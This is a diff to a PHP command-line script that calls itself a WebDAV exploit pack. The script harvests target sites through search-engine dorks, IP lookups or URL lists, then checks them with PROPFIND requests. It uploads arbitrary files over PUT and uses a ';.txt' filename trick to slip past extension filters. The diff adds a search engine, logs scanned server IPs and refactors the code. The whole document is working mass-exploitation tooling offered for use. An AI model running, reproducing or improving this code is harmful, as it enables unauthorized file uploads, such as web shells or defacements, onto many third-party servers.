@@ -2,69 +2,66 @@
 set_time_limit(0);
 error_reporting(0);
 
-echo "
-     _____       _    _          _       _      
-    (____ \   /\| |  | |        | |     (_)_    
-     _   \ \ /  \ |  | |__ ____ | | ___  _| |_  
-    | |   | / /\ \ \/ /___)  _ \| |/ _ \| |  _) 
-    | |__/ / |__| \  /___ | | | | | |_| | | |__ 
-    |_____/|______|\/(___/| ||_/|_|\___/|_|\___)
-    ######################| |###################	 
-    ######################|_|###################
-  
-      WebDAV exploit pack - coded by pers0nant
-	  
-	  
+echo "             
+  _________  ____    __         _       ___   
+  \_   __  \/  \ \  / /__ ____ | | ___ |_| |_ 
+    | |  / / /\ \ \/ / __/  _ \| |/ _ \| |  _\ 
+    | |_/ / /__\ \  /__  | | | | | |_| | | |___
+    |____/________\/____/| ||_/|_|\___/|_|_____\
+    -------------------- |_| -------------------
+
+    WebDAV exploit pack - coded by pers0nant	  
+
 ";
 
 $arg = getopt("", array("url:", "multi:", "server:", "upload:", "valid", "dork:"));
 
 if(isset($arg["url"])) {
 
+
+
 	if(!check_url($arg["url"])) die("    [*] URL is not valid\r\n\r\n\r\n");
-	
 	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("    [*] cannot determine attack vector\r\n\r\n\r\n");
 	
-	if(preg_match("/http/", $arg["url"])) $url = str_replace("http://", "", $arg["url"]);
+	if(preg_match("/https?/", $arg["url"])) $url = preg_replace("/https?:\/\//", "", $arg["url"]);
 	else $url = $arg["url"];
 
 	if(isset($arg["upload"])) {
 	
 		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
 		
-		list($filename, $val) = bypass($arg["upload"]);
-		
-		if($val) echo "    [*] the file will be uploaded as ".$filename."\r\n\r\n";
+		$filename = bypass($arg["upload"]);
 			
-		if(put($url, $arg["upload"])) echo "    [!] ".$filename." was successfully uploaded\r\n\r\n\r\n";
-		else echo "    [x] failed to upload ".basename($arg["upload"])."\r\n\r\n\r\n";
+		if(put($url, $arg["upload"])) echo "    [!] ".$filename." was successfully uploaded\r\n";
+		else echo "    [x] failed to upload ".basename($arg["upload"])."\r\n";
 	
 	} elseif(isset($arg["valid"])) {
 	
-		if(propfind($url)) echo "    [!] ".$arg["url"]." is possibly vulnerable\r\n\r\n\r\n";
-		else echo "    [x] ".$arg["url"]." is not vulnerable\r\n\r\n\r\n";
+		if(propfind($url)) die("    [!] ".$arg["url"]." is possibly vulnerable\r\n\r\n\r\n");
+		else die("    [x] ".$arg["url"]." is not vulnerable\r\n\r\n\r\n");
 		
 	}
 
+
+
 } elseif(isset($arg["multi"])) {
+
+
 	
 	if(!is_file($arg["multi"])) die("    [*] cannot find ".$arg["multi"]."\r\n\r\n\r\n");
-	
 	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");
-	
-	$source = file_get_contents($arg["multi"]);
-	$list = explode("\r\n", $source);
-	array_unique(array_filter($list));
+
+	$list = array_filter(file($arg["multi"], FILE_IGNORE_NEW_LINES), function($x){ return is_string($x) && trim($x) !== ""; });
+	array_unique($list);
 		
-	echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
+	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
+	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
 
 	if(isset($arg["upload"])) {
 	
 		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
 				
-		list($filename, $val) = bypass($arg["upload"]);
-		
-		if($val) echo "    [*] the file will be uploaded as ".$filename."\r\n\r\n";
+		$filename = bypass($arg["upload"]);
 		
 		foreach($list as $url) {
 		
@@ -72,7 +69,7 @@ if(isset($arg["url"])) {
 	
 			if(put($site, $arg["upload"])) echo "    [!] ".$site."\r\n";
 			else echo "    [x] ".$site."\r\n";
-	
+
 		}
 	
 	} elseif(isset($arg["valid"])) {
@@ -87,10 +84,13 @@ if(isset($arg["url"])) {
 		}
 	
 	}
-	
-	echo "\r\n\r\n";
+
+
 
 } elseif(isset($arg[server])) {
+
+
+	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");
 
 	if(filter_var($arg[server], FILTER_VALIDATE_IP)) {
 
@@ -104,72 +104,73 @@ if(isset($arg["url"])) {
 		if(!filter_var($ip, FILTER_VALIDATE_IP)) die("    [*] cannot retrieve server ip address\r\n\r\n\r\n");
 
 	}
-	
-	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");
 			
 	echo "    [*] ip address : ".$ip."\r\n\r\n";
+
+	// IP LOGGING ///////////////////////////////////////////////////////////////////////
 	
-	if(preg_match("/".str_replace(".", "\.", $ip)."/", file_get_contents("ip.txt"))) {
+	if(preg_match('/'.str_replace('.', '\.', $ip).'/', file_get_contents("ip.txt"))) {
 	
 		echo "    [*] the server had been scanned before. continue? (y/n) ";
 		$input = trim(fgets(STDIN));
 		echo "\r\n\r\n";
 		
-		if($input !== "y" AND $input !== "yes" AND $input !== "Y") exit; 
+		if(!preg_match('/(y|yes)/i', $input)) exit; 
 	
 	} else append($ip."\r\n", "ip.txt");
+
+	/////////////////////////////////////////////////////////////////////////////////////
 	
 	$list = dork("yahoo", "ip:".$ip);
 	
 	if(isset($arg["valid"])) {
 	
 		if(propfind($list[0])) die("    [!] the server is vulnerable\r\n\r\n\r\n");
-		else die("    [x] the server is vulnerable\r\n\r\n\r\n");
+		else die("    [x] the server is not vulnerable\r\n\r\n\r\n");
 	
 	}
 	
-	if(count($list) != 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
+	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
 	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
 	
 	if(isset($arg["upload"])) {
 	
 		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
 		
-		list($filename, $val) = bypass($arg["upload"]);
-		
-		if($val) echo "    [*] the file will be uploaded as ".$filename."\r\n\r\n";
+		$filename = bypass($arg["upload"]);
 			
 		foreach($list as $url) {
 		
 			if(put($url, $arg["upload"])) echo "    [!] ".$url."\r\n";
 			else echo "    [x] ".$url."\r\n";
 		
-		}
-	
-		echo "\r\n\r\n";	
+		}	
 
 	}
+
+
 	
 } elseif(isset($arg["dork"])) {
 
+
+
 	$exp = explode(",", $arg["dork"]);
-	
+
 	if(!isset($exp[1])) die("   [*] invalid dork argument\r\n\r\n");
-	
+	if(!preg_match('/(ask|bing|conduit|yahoo)/', $exp[0])) die("   [*] invalid dork engine\r\n\r\n");
 	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");
-	
+
 	$list = dork($exp[0], $exp[1]);
+	array_unique($list);
 	
-	if(count($list) != 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
+	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
 	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
 	
 	if(isset($arg["upload"])) {
 	
 		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
 		
-		list($filename, $val) = bypass($arg["upload"]);
-		
-		if($val) echo "    [*] the file will be uploaded as ".$filename."\r\n\r\n";
+		$filename = bypass($arg["upload"]);
 			
 		foreach($list as $url) {
 		
@@ -188,8 +189,8 @@ if(isset($arg["url"])) {
 		}
 	
 	}
-	
-	echo "\r\n\r\n";
+
+
 
 } else {
 
@@ -205,29 +206,33 @@ if(isset($arg["url"])) {
         --multi [LIST]           set multiple targets enlisted in textual file
         --server [IP|DOMAIN]     set multiple targets hosted in the same server
         --dork [ENGINE,DORK]     set multiple target from search dorks
-	
 		
+
     attack vector :	
 		
         --upload [FILE]          upload file to server (extension bypass)
         --valid                  scan for webDAV possible vulnerability
 	  
-	  
+
     engine (dork usage) :
 	
         ask                      www.ask.com
         bing                     www.bing.com
+        conduit                  search.conduit.com
         yahoo                    search.yahoo.com
-	  
     
+
     example:
 
         php ".$argv[0]." --url site.com --upload x.html
         php ".$argv[0]." --multi list.txt --valid
         php ".$argv[0]." --server 127.0.0.1 --upload x.txt
-        php ".$argv[0]." --dork conduit,inurl:asp --valid \r\n\r\n\r\n";
+        php ".$argv[0]." --dork conduit,inurl:asp --valid \r\n";
 
 }
+
+echo "\r\n\r\n";
+exit;
 
 function get_source($url) {
 
@@ -244,8 +249,14 @@ function get_source($url) {
 
 function clean($url) {
 
-	$exp = explode("/", $url);
-	return $exp[2];
+	$url = preg_replace('/https?:\/\//', '', $url);
+
+	if(preg_match('/\//', $url)) {
+
+		$exp = explode("/", $url);
+		return $exp[0];
+
+	} else return $url; 
 
 }
 
@@ -262,7 +273,7 @@ function dork($engine, $dork) {
 	$dork = urlencode(stripslashes($dork));
 	$urls = array();
 	
-	if($engine == "ask") {
+	if($engine === "ask") {
 
 		$search = "http://www.ask.com/web?q=";
 		$page = "&page=";
@@ -270,7 +281,15 @@ function dork($engine, $dork) {
 		$next = '/class="pgnav fl"><a class="/';
 		$start = 1;
 	
-	} elseif($engine == "bing") {
+	} elseif($engine === "conduit"){
+
+		$search = "http://search.conduit.com/Results.aspx?q=";
+		$page = "&start=";
+		$regex = '/<div class="title"><a href="(.*)" id="/';
+		$next = '/Next <span class="paging_icon next">/';
+		$start = 0;
+
+	} elseif($engine === "bing") {
 
 		$search = "http://www.bing.com/search?q=";
 		$page = "&first=";	
@@ -278,7 +297,7 @@ function dork($engine, $dork) {
 		$next = '/Next<\/a><\/li><\/ul>/';
 		$start = 0;
 	
-	} elseif($engine == "yahoo") {
+	} elseif($engine === "yahoo") {
 	
 		$search = "http://search.yahoo.com/search?p=";
 		$page = "&b=";	
@@ -288,9 +307,9 @@ function dork($engine, $dork) {
 	
 	}
 	
-	for($id=$start ; $id<=999; $id++) {
+	for($id = $start ; $id <= 999; $id++) {
 		
-		if($engine != "ask") {
+		if($engine !== "ask") {
 		
 			$id = $id * 10;
 			$id = $id + 1;
@@ -302,7 +321,7 @@ function dork($engine, $dork) {
 		
 		foreach($matches[1] as $site) {
 			
-			if($engine == "yahoo") array_push($urls, yclean($site));
+			if($engine === "yahoo") array_push($urls, yclean($site));
 			else array_push($urls, clean($site));
 
 		}
@@ -417,8 +436,12 @@ function bypass($file) {
 	$base = basename($file);
 	$exp = explode(".", $base);
 	
-	if($exp[1] !== "txt" && $exp[1] !== "htm" && $exp[1] !== "html") return array($base.";.txt", TRUE);
-	else return array($base, FALSE);
+	if($exp[1] !== "txt" && $exp[1] !== "htm" && $exp[1] !== "html") {
+
+		echo "    [*] the file will be uploaded as ".$base.";.txt\r\n\r\n";
+		return $base.";.txt";
+
+	} else return $base;
 	
 }
 
